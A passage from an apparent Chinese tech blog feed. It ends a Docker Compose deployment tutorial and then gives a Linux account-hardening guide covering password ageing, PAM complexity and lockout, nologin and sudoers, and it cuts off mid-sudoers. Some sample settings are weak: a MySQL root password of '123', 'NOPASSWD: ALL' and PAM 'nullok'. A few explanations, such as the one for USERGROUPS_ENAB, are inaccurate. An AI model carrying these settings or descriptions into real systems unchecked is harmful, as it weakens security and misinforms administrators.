punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"3306:3306"</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token key atrule">TZ</span><span class="token punctuation">:</span> Asia/Shanghai      <span class="token key atrule">MYSQL_ROOT_PASSWORD</span><span class="token punctuation">:</span> <span class="token number">123</span>    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"./mysql/conf:/etc/mysql/conf.d"</span>      <span class="token punctuation">-</span> <span class="token string">"./mysql/data:/var/lib/mysql"</span>      <span class="token punctuation">-</span> <span class="token string">"./mysql/init:/docker-entrypoint-initdb.d"</span>    <span class="token key atrule">networks</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> hm<span class="token punctuation">-</span>net  <span class="token key atrule">hmall</span><span class="token punctuation">:</span>    <span class="token key atrule">build</span><span class="token punctuation">:</span>       <span class="token key atrule">context</span><span class="token punctuation">:</span> .      <span class="token key atrule">dockerfile</span><span class="token punctuation">:</span> Dockerfile    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> hmall    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"8080:8080"</span>    <span class="token key atrule">networks</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> hm<span class="token punctuation">-</span>net    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> mysql  <span class="token key atrule">nginx</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> nginx    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> nginx    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"18080:18080"</span>      <span class="token punctuation">-</span> <span class="token string">"18081:18081"</span>    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"./nginx/nginx.conf:/etc/nginx/nginx.conf"</span>      <span class="token punctuation">-</span> <span class="token string">"./nginx/html:/usr/share/nginx/html"</span>    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> hmall    <span class="token key atrule">networks</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> hm<span class="token punctuation">-</span>net<span class="token key atrule">networks</span><span class="token punctuation">:</span>  <span class="token key atrule">hm-net</span><span class="token punctuation">:</span>    <span class="token key atrule">name</span><span class="token punctuation">:</span> hmall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重点关注各类路径问题。</p><blockquote><p>Docker Compose 文件中的 <code>version</code> 字段用于指定使用的 Compose 文件格式版本。这个字段对于确保你的 Compose 文件能够被 Docker Compose 正确解析非常重要，因为不同版本的 Compose 支持不同的语法和特性。</p></blockquote><p>将之前的容器/镜像全都删除之后，创建一个新的目录，目录内容：</p><p>还需要注意一下Dockerfile中构建的镜像是之前idea打好的jar包——hm-service.jar。</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-19%2018.12.54.png" alt="截屏2024-12-19 18.12.54"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> compose <span class="token parameter variable">-p</span> heimamall  up  <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-19%2018.17.37.png" style="zoom:50%;"><p>dps查看容器：</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-19%2018.17.49.png" alt="截屏2024-12-19 18.17.49" style="zoom:50%;"><p>访问测试：</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-19%2018.18.48.png" style="zoom:50%;"><p>docker compose一键部署成功。</p><p>删除项目：</p><pre class="line-numbers language-none"><code class="language-none">docker compose -p heimamall  down<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-19%2018.27.57.png" alt="截屏2024-12-19 18.27.57"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://b11et3un53m.feishu.cn/wiki/Rfocw7ctXij2RBkShcucLZbrn2d">https://b11et3un53m.feishu.cn/wiki/Rfocw7ctXij2RBkShcucLZbrn2d</a> </p><p><a href="https://www.cnblogs.com/dakewei/p/10831125.html">https://www.cnblogs.com/dakewei/p/10831125.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 虚拟化技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚拟化技术 </tag>
            
            <tag> 容器化技术 </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux安全加固之账户安全加固</title>
      <link href="/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/"/>
      <url>/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/</url>
      
        <content type="html"><![CDATA[<h1 id="一、账号安全的重要性"><a href="#一、账号安全的重要性" class="headerlink" title="一、账号安全的重要性"></a>一、账号安全的重要性</h1><p>在当今很多网络系统都以用户名(帐号)和口令作为鉴权方式，口令的重要性就可想而知了。口令就相当手进入家门的钥匙，当他人有一把可以进入你家的钥匙，想想你的安全、你的财物、你的隐私。。。害怕了吧。因为弱口令很容易被他人猜到或破解，所以如果你使用弱口令，就像把家门钥匙放在家门口的垫子下面，是非常危险的。</p><p>一般攻击者的渗透过程都会经过如下几个阶段：</p><ul><li>扫描探测=&gt;渗透攻击=&gt;攻陷入侵=&gt;恶意行为。</li></ul><h2 id="1-1-扫描探测"><a href="#1-1-扫描探测" class="headerlink" title="1.1 扫描探测"></a>1.1 扫描探测</h2><p>扫描探测：攻击者在攻击前的对目标的扫描，包括网络扫描、系统扫描、端口、漏洞扫描等，扫描行为是攻击入侵的前期准备阶段，通过信息收集，掌握目标机器的系统，漏洞信息，对进一步进行入侵攻击有事半功倍的效果。</p><ul><li>如使用netdiscover/nmap等工具</li></ul><img src="/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/%E6%88%AA%E5%B1%8F2024-12-11%2013.31.32.png" style="zoom:50%;"><h2 id="1-2-渗透攻击"><a href="#1-2-渗透攻击" class="headerlink" title="1.2 渗透攻击"></a>1.2 渗透攻击</h2><p>该阶段是已经对目标机器做了扫描，或是直接对目标机器进行攻击，包括利用系统栈堆方面的漏洞，利用Web系统平台方面的漏洞，逻辑配置错误方面的漏洞，内存破坏方面的漏洞等，对目标主机发起攻击。</p><ul><li>如使用hydra进行口令爆破</li></ul><img src="/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/%E6%88%AA%E5%B1%8F2024-12-11%2013.35.27.png" style="zoom:40%;"><h2 id="1-3-攻陷入侵"><a href="#1-3-攻陷入侵" class="headerlink" title="1.3 攻陷入侵"></a>1.3 攻陷入侵</h2><p>该阶段表示了目标主机已经被黑客成功攻陷，接下来攻击者可以做他想做的事情，攻陷阶段的表现形式比如，SSH登录成功，FTP登录成功。</p><ul><li>如下，通过hydra成功爆破出ssh的账号密码，然后进行登录。</li></ul><img src="/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/%E6%88%AA%E5%B1%8F2024-12-11%2013.37.02.png" style="zoom:50%;"><h2 id="1-4-恶意行为"><a href="#1-4-恶意行为" class="headerlink" title="1.4 恶意行为"></a>1.4 恶意行为</h2><p>攻击者在目标主机可能进行删库，修改配置文件，下载数据库文件或者安装完恶意软件后进行对主机进行恶意操作等。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>通过上述示例，我们可以了解到如果账户和口令安全性较低会大大增加被攻陷入侵的可能性，因此账号口令安全加固的重要性不言而喻。</p><p>一般而言，一种常见的加固思路比如：修改用户口令有效机制，用户离开工作岗位一段时间后，其账户自动失效，就算管理员忘记删除该账户，该账户也不会给系统带来危害。</p><h1 id="二、账户期限加固"><a href="#二、账户期限加固" class="headerlink" title="二、账户期限加固"></a>二、账户期限加固</h1><h2 id="2-1-etc-login-defs文件"><a href="#2-1-etc-login-defs文件" class="headerlink" title="2.1 /etc/login.defs文件"></a>2.1 /etc/login.defs文件</h2><p><code>/etc/login.defs</code> 是一个系统配置文件，它包含了许多与用户账户和密码相关的配置选项。在类 Unix 系统中，这个文件定义了系统级的用户账户和密码管理的默认值和限制。不同的系统和发行版可能会有不同的配置选项，但以下是一些常见的配置项：</p><ol><li><strong>PASS_MAX_DAYS</strong>：密码的最大有效天数。</li><li><strong>PASS_MIN_DAYS</strong>：密码的最小有效天数。</li><li><strong>PASS_WARN_AGE</strong>：在密码过期前多少天开始警告用户。</li><li><strong>ENCRYPT_METHOD</strong>：密码加密的方法。</li><li><strong>UID_MIN</strong> 和 <strong>UID_MAX</strong>：系统用户和组的最小和最大用户ID。</li><li><strong>GID_MIN</strong> 和 <strong>GID_MAX</strong>：系统组的最小和最大组ID。</li><li><strong>CREATE_HOME</strong>：当创建新用户时是否创建家目录。</li><li><strong>UMASK</strong>：新文件的默认权限掩码。</li><li><strong>USERGROUPS_ENAB</strong>：是否允许用户属于多个组。</li><li><strong>MAIL_DIR</strong>：用户的邮件目录。</li><li><strong>MAIL_FILE</strong>：用户的邮件文件。</li><li><strong>SU_NAME</strong>：默认的超级用户名称。</li></ol><p>修改 <code>/etc/login.defs</code> 文件可以改变这些默认值，但通常需要管理员权限。在修改此文件时应该非常小心，因为错误的配置可能会导致安全问题或系统功能不正常。在编辑文件后，通常需要重新启动相关的服务或者系统，以使更改生效。对于大多数更改，你可能需要重新启动 <code>pam</code>（可插拔认证模块）服务或者重启系统。</p><img src="/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/%E6%88%AA%E5%B1%8F2024-12-11%2014.01.46.png" style="zoom:30%;"><p>通常要修改下面两个个字段：</p><ol><li><strong>PASS_MAX_DAYS</strong>：密码的最大有效天数。</li><li><strong>PASS_WARN_AGE</strong>：在密码过期前多少天开始警告用户。</li></ol><h2 id="2-2-etc-default-useradd文件"><a href="#2-2-etc-default-useradd文件" class="headerlink" title="2.2  /etc/default/useradd文件"></a>2.2  /etc/default/useradd文件</h2><p>在 <code>/etc/default/useradd</code> 文件中，<code>INACTIVE</code> 和 <code>EXPIRE</code> 是两个与用户账户过期相关的配置项：</p><ol><li><strong>INACTIVE</strong>：这个配置项用来设置密码过期后账户被禁用之前的天数。如果 <code>INACTIVE</code> 设置为 <code>-1</code>，则表示账户不会因密码过期而被禁用，这是默认值。如果设置为其他值，比如 <code>30</code>，则表示如果用户在密码过期后30天内没有更新密码，账户将被禁用。</li><li><strong>EXPIRE</strong>：这个配置项用来设置账户的过期日期。如果设置了 <code>EXPIRE</code>，那么账户将在指定的日期后过期。日期格式通常是 <code>MM/DD/YY</code> 或 <code>YYYY-MM-DD</code>。如果没有设置 <code>EXPIRE</code> 或者留空，那么账户将不会过期。</li></ol><p>例如，如果你想要设置一个新用户的账户在密码过期后7天内被禁用，以及账户在2024年12月31日过期，你可以在 <code>/etc/default/useradd</code> 文件中设置如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">INACTIVE</span><span class="token operator">=</span><span class="token number">7</span><span class="token assign-left variable">EXPIRE</span><span class="token operator">=</span><span class="token number">2024</span>-12-31<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这样，任何新添加的用户都将遵循这些默认设置。需要注意的是，这些设置只影响新添加的用户，对于已经存在的用户，需要使用 <code>usermod</code> 命令单独设置。</p><img src="/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/%E6%88%AA%E5%B1%8F2024-12-11%2014.06.48.png" style="zoom:30%;"><h1 id="三、账号密码策略加固"><a href="#三、账号密码策略加固" class="headerlink" title="三、账号密码策略加固"></a>三、账号密码策略加固</h1><h2 id="3-1-密码复杂度加固"><a href="#3-1-密码复杂度加固" class="headerlink" title="3.1 密码复杂度加固"></a>3.1 密码复杂度加固</h2><h3 id="3-1-1-etc-pam-d-system-auth简介"><a href="#3-1-1-etc-pam-d-system-auth简介" class="headerlink" title="3.1.1 /etc/pam.d/system-auth简介"></a>3.1.1 /etc/pam.d/system-auth简介</h3><p><code>/etc/pam.d/system-auth</code> 是一个非常重要的配置文件，它位于 Linux 系统中，用于定义用户认证的行为。PAM（Pluggable Authentication Modules）是一个动态链接库和一组应用程序接口（API），它们允许将多个认证机制集成到系统中的应用程序中。<code>system-auth</code> 文件通常用于处理系统的认证任务，如登录、密码更改等。</p><h3 id="3-1-2-配置文件结构"><a href="#3-1-2-配置文件结构" class="headerlink" title="3.1.2 配置文件结构"></a>3.1.2 配置文件结构</h3><p><code>/etc/pam.d/system-auth</code> 文件包含一系列的模块条目，每个条目都指定了如何处理特定的认证请求。这些条目通常包括以下字段：</p><ol><li><strong>控制标志</strong>：如 <code>auth</code>, <code>account</code>, <code>password</code>, <code>session</code>，它们指定了 PAM 模块的类型。</li><li><strong>PAM 模块路径</strong>：模块的完整路径，如 <code>pam_unix.so</code>。</li><li><strong>模块选项</strong>：传递给 PAM 模块的参数。</li><li><strong>模块参数</strong>：可选的，传递给 PAM 模块的额外参数。</li></ol><p>示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#%PAM-1.0</span>auth        required      pam_env.soauth        sufficient    pam_unix.so nullok try_first_passauth        <span class="token punctuation">[</span>default<span class="token operator">=</span>die<span class="token punctuation">]</span> pam_faillock.so preauth silent audit <span class="token assign-left variable">deny</span><span class="token operator">=</span><span class="token number">5</span> <span class="token assign-left variable">unlock_time</span><span class="token operator">=</span><span class="token number">900</span>auth        sufficient    pam_succeed_if.so uid <span class="token operator">&gt;=</span> <span class="token number">1000</span> quietauth        required      pam_deny.soaccount     required      pam_access.soaccount     required      pam_unix.so broken_shadowaccount     <span class="token punctuation">[</span>default<span class="token operator">=</span>bad <span class="token assign-left variable">success</span><span class="token operator">=</span>ok <span class="token assign-left variable">user_unknown</span><span class="token operator">=</span>ignore<span class="token punctuation">]</span> pam_succeed_if.so quietpassword    requisite    pam_pwquality.so <span class="token assign-left variable">retry</span><span class="token operator">=</span><span class="token number">3</span>password    sufficient    pam_unix.so md5 shadow use_authtok try_first_passpassword    <span class="token punctuation">[</span>default<span class="token operator">=</span>die<span class="token punctuation">]</span> pam_faillock.so authfail audit <span class="token assign-left variable">deny</span><span class="token operator">=</span><span class="token number">5</span> <span class="token assign-left variable">unlock_time</span><span class="token operator">=</span><span class="token number">900</span>password    <span class="token punctuation">[</span>default<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">]</span> pam_faillock.so authsucc audit <span class="token assign-left variable">deny</span><span class="token operator">=</span><span class="token number">5</span> <span class="token assign-left variable">unlock_time</span><span class="token operator">=</span><span class="token number">900</span>password    sufficient    pam_deny.sosession     optional      pam_keyinit.so force revokesession     required      pam_limits.sosession     <span class="token punctuation">[</span>default<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">]</span>   pam_succeed_if.so <span class="token function">service</span> <span class="token keyword">in</span> crond quiet use_uidsession     sufficient    pam_unix.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li>ubuntu系统没有/etc/pam.d/system-auth文件？【/etc/pam.d/common-password】</li></ul><p>在Ubuntu系统中，<code>/etc/pam.d/system-auth</code> 文件可能不存在，这是因为Ubuntu使用的是不同的文件来处理PAM（Pluggable Authentication Modules）配置。Ubuntu系统中与密码设置及登录控制相关的文件通常是 <code>/etc/pam.d/common-password</code>。这是因为Ubuntu和其他基于Debian的系统使用 <code>/etc/pam.d/common-password</code> 作为密码认证的通用配置文件，而不是像一些基于Red Hat的系统那样使用 <code>/etc/pam.d/system-auth</code> 文件。</p><p>因此，如果你在Ubuntu系统中寻找类似于 <code>/etc/pam.d/system-auth</code> 的配置文件，你应该查看 <code>/etc/pam.d/common-password</code> 文件，以及其他可能的 <code>/etc/pam.d/</code> 目录下的文件，如 <code>/etc/pam.d/common-auth</code> 等，这些文件共同定义了Ubuntu系统的认证和账户管理策略。</p></blockquote><h3 id="3-1-3-密码复杂度设置"><a href="#3-1-3-密码复杂度设置" class="headerlink" title="3.1.3 密码复杂度设置"></a>3.1.3 密码复杂度设置</h3><p>要设置密码复杂度，你需要编辑 <code>/etc/pam.d/common-password</code> 文件，并找到包含 <code>pam_pwquality.so</code> 或 <code>pam_cracklib.so</code> 的行，然后添加或修改上述参数。例如，以下配置要求密码至少12个字符长，至少包含一个大写字母、一个小写字母、一个数字和一个特殊字符，并且root用户也必须遵守这些规则：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">password    requisite     pam_pwquality.so try_first_pass local_users_only <span class="token assign-left variable">retry</span><span class="token operator">=</span><span class="token number">3</span> <span class="token assign-left variable">authtok_type</span><span class="token operator">=</span> <span class="token assign-left variable">minlen</span><span class="token operator">=</span><span class="token number">12</span> <span class="token assign-left variable">lcredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">ucredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">dcredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">ocredit</span><span class="token operator">=</span>-1 enforce_for_root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">minlen</span><span class="token operator">=</span>N：设置密码的最小长度。例如，minlen<span class="token operator">=</span><span class="token number">12</span> 表示密码至少需要12个字符。<span class="token assign-left variable">dcredit</span><span class="token operator">=</span>N：控制密码中数字的出现次数。当N<span class="token operator">&gt;</span><span class="token number">0</span>时，表示新密码中数字出现的最大次数；当N<span class="token operator">&lt;</span><span class="token number">0</span>时，表示新密码中数字出现的最少次数。例如，dcredit<span class="token operator">=</span>-1 表示密码至少包含一个数字。<span class="token assign-left variable">ucredit</span><span class="token operator">=</span>N：控制密码中大写字母的出现次数。规则与 dcredit 相同。ucredit<span class="token operator">=</span>-1 表示密码至少包含一个大写字母。<span class="token assign-left variable">lcredit</span><span class="token operator">=</span>N：控制密码中小写字母的出现次数。规则与 dcredit 相同。lcredit<span class="token operator">=</span>-1 表示密码至少包含一个小写字母。<span class="token assign-left variable">ocredit</span><span class="token operator">=</span>N：控制密码中特殊字符的出现次数。规则与 dcredit 相同。ocredit<span class="token operator">=</span>-1 表示密码至少包含一个特殊字符。<span class="token assign-left variable">retry</span><span class="token operator">=</span>N：定义用户在密码失败后可以重试的次数。例如，retry<span class="token operator">=</span><span class="token number">3</span> 允许用户在密码输入错误后重试3次。<span class="token assign-left variable">difok</span><span class="token operator">=</span>N：新密码与旧密码至少不同的字符数。例如，difok<span class="token operator">=</span><span class="token number">3</span> 表示新密码必须与旧密码至少有3个字符不同。enforce_for_root：即使是root用户设置密码，也应强制执行复杂性策略。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者，如果你使用的是 <code>pam_cracklib.so</code> 模块，配置可能如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">password requisite pam_cracklib.so <span class="token assign-left variable">retry</span><span class="token operator">=</span><span class="token number">3</span> <span class="token assign-left variable">minlen</span><span class="token operator">=</span><span class="token number">12</span> <span class="token assign-left variable">difok</span><span class="token operator">=</span><span class="token number">3</span> <span class="token assign-left variable">ucredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">lcredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">dcredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">ocredit</span><span class="token operator">=</span>-1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在进行这些更改后，为了使配置生效，你可能需要重新启动相关的服务或者系统。请记得在修改系统文件之前备份原始文件，以便在出现问题时可以恢复。</p><h2 id="3-2-其他密码策略的配置"><a href="#3-2-其他密码策略的配置" class="headerlink" title="3.2 其他密码策略的配置"></a>3.2 其他密码策略的配置</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auth required pam_tally2.so <span class="token assign-left variable">deny</span><span class="token operator">=</span><span class="token number">6</span> <span class="token assign-left variable">unlock_time</span><span class="token operator">=</span><span class="token number">300</span> even_deny_root <span class="token assign-left variable">root_unlock_time</span><span class="token operator">=</span><span class="token number">60</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>pam_tally2.so</code>：这是一个账户锁定模块，用于防止暴力破解攻击。</li><li><code>deny=6</code>：如果用户连续6次输入错误的密码，账户将被锁定。</li><li><code>unlock_time=300</code>：账户锁定后，将在300秒（5分钟）后自动解锁。</li><li><code>even_deny_root</code>：这个选项意味着即使是root用户，也会受到账户锁定的限制。</li><li><code>root_unlock_time=60</code>：对于root用户，账户锁定时间是60秒。</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">password requisite pam_cracklib.so try_first_pass <span class="token assign-left variable">retry</span><span class="token operator">=</span><span class="token number">3</span> <span class="token assign-left variable">dcredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">lcredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">ucredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">ocredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">minclass</span><span class="token operator">=</span><span class="token number">3</span> <span class="token assign-left variable">minlen</span><span class="token operator">=</span><span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>pam_cracklib.so</code>：另一个用于检查密码质量的模块。</li><li><code>try_first_pass</code>：尝试使用前一阶段的密码。当这个选项被设置时，PAM模块会尝试使用在认证阶段（通常是用户登录时）已经输入的密码，而不是要求用户再次输入密码。这意味着如果用户在登录时输入了密码，这个密码会被“记住”，并在需要时用于密码更改操作。</li><li><code>retry=3</code>：用户可以重试3次。</li><li><code>dcredit=-1</code>：密码至少包含一个数字。</li><li><code>lcredit=-1</code>：密码至少包含一个小写字母。</li><li><code>ucredit=-1</code>：密码至少包含一个大写字母。</li><li><code>ocredit=-1</code>：密码至少包含一个特殊字符。</li><li><code>minclass=3</code>：密码至少包含三种不同类型的字符。</li><li><code>minlen=8</code>：密码的最小长度为8个字符。</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">password sufficient pam_unix.so sha512 shadow nullok try_first_pass use_authtok <span class="token assign-left variable">remember</span><span class="token operator">=</span><span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>pam_unix.so</code>：使用SHA-512算法来加密密码。</li><li><code>shadow</code>：使用影子密码文件。</li><li><code>nullok</code>：允许空密码。</li><li><code>try_first_pass</code>：尝试使用前一阶段的密码。</li><li><code>use_authtok</code>：使用认证阶段的密码。</li><li><code>remember=5</code>：记住用户最近使用的5个密码，防止用户重复使用旧密码。</li></ul><h1 id="四、登录控制"><a href="#四、登录控制" class="headerlink" title="四、登录控制"></a>四、登录控制</h1><h2 id="4-1-禁止除root以外的所有用户登录"><a href="#4-1-禁止除root以外的所有用户登录" class="headerlink" title="4.1 禁止除root以外的所有用户登录"></a>4.1 禁止除root以外的所有用户登录</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">touch</span> /etc/nologin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><p><strong>阻止普通用户登录</strong>：当 <code>/etc/nologin</code> 文件存在时，除了 root 用户之外的所有用户在尝试登录时都会收到一条消息，通常是 “/etc/nologin: Permission denied” 或者文件中定义的消息，并且登录尝试会被拒绝。这可以用于系统维护或在系统更新期间防止用户登录。</p></li><li><p><strong>自定义登录消息</strong>：你可以在 <code>/etc/nologin</code> 文件中添加自定义消息，这样当用户尝试登录时，他们会看到这条消息而不是默认的拒绝消息。这可以用来通知用户系统维护的时间或者为什么他们不能登录。</p></li><li><p><strong>系统维护</strong>：在系统需要进行维护或更新时，创建 <code>/etc/nologin</code> 文件是一种快速通知所有用户系统暂时不可用的方法。</p></li></ol><p>例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"System maintenance in progress. Please try again later."</span> <span class="token operator">&gt;</span> /etc/nologin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将会在 <code>/etc/nologin</code> 文件中写入一条消息，告知用户系统正在进行维护。</p><p>请注意，创建 <code>/etc/nologin</code> 文件是一个影响所有非 root 用户的操作，因此在执行此操作之前应该谨慎考虑，并确保所有受影响的用户都得到了适当的通知。</p><h1 id="五、账户权限控制"><a href="#五、账户权限控制" class="headerlink" title="五、账户权限控制"></a>五、账户权限控制</h1><h2 id="5-1-etc-sudoers简介"><a href="#5-1-etc-sudoers简介" class="headerlink" title="5.1 /etc/sudoers简介"></a>5.1 /etc/sudoers简介</h2><p><code>/etc/sudoers</code> 文件是 Unix 和类 Unix 系统中用于定义哪些用户可以执行哪些命令以及他们可以在哪台机器上执行这些命令的核心配置文件。这个文件是 sudo 工具的基础，sudo 允许授权的用户以其他用户的安全权限执行命令，默认情况下是以超级用户（root）的权限执行。</p><p>编辑 <code>/etc/sudoers</code> 文件需要非常小心，因为错误的配置可能导致系统无法正常使用 sudo 命令。推荐使用 <code>visudo</code> 命令来编辑这个文件，因为 <code>visudo</code> 会在保存前检查语法错误，从而防止配置错误。</p><h2 id="5-2-sudders配置示例"><a href="#5-2-sudders配置示例" class="headerlink" title="5.2 sudders配置示例"></a>5.2 sudders配置示例</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 允许用户 alice 从任何主机执行任何命令，不需要密码</span>alice <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: ALL<span class="token comment"># 允许用户 bob 仅在本地主机执行命令，需要密码</span>bob <span class="token assign-left variable">localhost</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> ALL<span class="token comment"># 允许整个 wheel 组的用户在任何主机上执行命令，需要密码</span>%wheel <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> ALL<span class="token comment"># 定义一个命令别名，例如定义一个只允许重启服务的别名</span>Cmnd_Alias REBOOT <span class="token operator">=</span> /sbin/shutdown <span class="token parameter variable">-r</span> now, /sbin/reboot<span class="token comment"># 允许用户 carol 执行 REBOOT 别名中的命令，不需要密码</span>carol <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: REBOOT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/%E6%88%AA%E5%B1%8F2024-12-11%2014.38.50.png" style="zoom:30%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zhangsan <span class="token assign-left variable">ALL</span><span class="token operator">=</span>NOPASSWD: /bin/passwd, <span class="token operator">!</span>/bin/passwd root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ol><li>zhangsan**：这是用户名，表示这个配置规则适用于名为 <code>zhangsan</code> 的用户。</li><li><strong>ALL</strong>：这表示该规则适用于所有主机。<code>zhangsan</code> 用户可以在任何主机上使用以下命令。</li><li><strong>=NOPASSWD</strong>：这是一个选项，表示在执行后面的命令时，不需要输入密码。<code>NOPASSWD</code> 是一个常用的 sudo 选项，用于提高便利性，但需要注意这可能会带来安全风险。</li><li><strong>/bin/passwd</strong>：这是一个命令别名，通常用于更改用户密码。在这里，它允许 <code>zhangsan</code> 用户更改任何用户的密码，包括自己的。</li><li><strong>!/bin/passwd root</strong>：这里的感叹号 <code>!</code> 表示否定，即 <code>zhangsan</code> 用户不允许使用 <code>/bin/passwd</code> 命令来更改 root 用户的密码。</li></ol><p>综合来看，这行配置允许用户 <code>zhangsan</code> 在所有主机上更改任何用户的密码，但有一个例外：<code>zhangsan</code> 不能更改 root 用户的密码，即使不需要输入密码。这种配置可以用于赋予特定用户管理其他用户密码的权限，同时保留对 root 密码的控制权。</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root    <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL:ALL<span class="token punctuation">)</span> ALL<span class="token comment"># 这一行赋予 root 用户在所有主机（ALL）上以任何用户身份（ALL）执行任何命令（ALL）的权限。</span>%admin <span class="token assign-left variable">ALL</span><span class="token 